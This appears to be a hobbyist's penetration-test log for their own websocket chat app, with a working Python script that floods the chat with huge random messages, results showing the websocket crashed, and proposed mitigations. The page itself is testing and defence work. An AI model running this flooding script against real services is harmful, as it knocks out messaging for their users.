<div id="base-bar">PT1: Basic Message Spammer 26/04/2025</div>
<div id="base-box" class="custom-scroll">

  <h2>Aims</h2>
  <ul>
    <li>To crash the website entirely so no one could connect</li>
    <li>To crash the websocket</li>
    <li>To prevenet use of the chat</li>
  </ul>

  <h2>Method</h2>
  <p>
    Created a simple file that connected to the websocket, sent a fake refresh message to the backend to mimic the inital connection that the frontend does.
    Then proceeded to generate a random, custom length message and sent it to the websocket and repeated this as many times as nesessary.
  </p>


  <h2>Code Used</h2>
  <pre><code>
import websocket
import json
import random
import string

ws_url = "ws://IP:Port/ws"              #websocket url to attack

total_messages = 100000                             #total number of messages sent

def random_message(length):                         #function to create the random message string
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))   #selects from all ascii letters and numbers

while True:     #runs until keyboard interrupt
    try:
        ws = websocket.create_connection(ws_url)    #connects to the websocket
        print(f"Connected to the websocket")
        print(f"Now sending a refresh message to create profile")
        refresh_msg = {"type": "refresh"}     #creates the refresh message
        ws.send(json.dumps(refresh_msg))      #sends the refresh message as a json packet
        for i in range(total_messages):       #loops over the amount of messages you wish to send
            data = {                          #creates the data packet with the necessary info to direct it where you want
                "type": "chat",               #tells server its a message for a chat and not something like a command
                "room": "mainRoom",           #tells server where to display it
                "message": random_message(20000)    #tells the server the message, in this case 20000 chars long
            }
            ws.send(json.dumps(data))         #sends the message to the server
        print(f"Messages Sent")

    except Exception as e:                   #catches any errors
        print(f"Error found:", e)
  </code></pre>

  <h2>Results</h2>
  <p>
    While we did not manage to bring down the entire website, we managed to with great ease crash the websocket. After only a few seconds, the chat was
    filled and the websocket was crashed, bringing down all wessaging capabilities and the user-list. Basically rendering any backend capabilities
    obsolute. I would call this a success.
    I did actually manage to crash my pi 3 a few times but not reliably. Also after further testing, it seems that I can't attack the website when
    it is hosted on my laptop? This could be I inputted the IP wrong somehow but more likely my laptop has better prevention/the way I run it
    protects the server more. On my pi, it runs in the background on boot using systemd, while my laptop, i just run uvicorn from the terminal in vsc?
  </p>

  <h2>Mitigations</h2>
  <ul>
    <li>Could either create a spam limiter that auto IP bans anyone who spams too much</li>
    <li>Could make an authentication system to prevent anyone from sending a message</li>
    <li>Could also make an auto clear function or mute incase the IP ban doesn't work as a backup</li>
  </ul>

<h2>Improvements</h2>
  <li>Could make the script auto stop when disconnected from websocket, ie has done its job</li>
  <li>Will soon create a script that spams websocket connections as message spamming has very easy mitigation measures</li>
</div>